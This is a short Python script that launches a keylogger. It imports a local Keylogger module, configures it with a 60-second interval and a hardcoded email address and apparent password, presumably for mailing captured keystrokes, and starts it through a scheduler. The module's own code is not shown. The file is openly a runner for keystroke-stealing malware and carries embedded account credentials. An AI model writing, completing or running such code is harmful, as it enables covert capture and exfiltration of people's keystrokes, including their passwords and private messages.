from sched import scheduler
import Keylogger
def main():
    my_keylogger = Keylogger.Keylogger(60,"guajajabamba@hotmail.com","peruxdnandugaa77")
    my_keylogger.start()

scheduler=scheduler()
scheduler.enter(1,0,main)

scheduler.run()
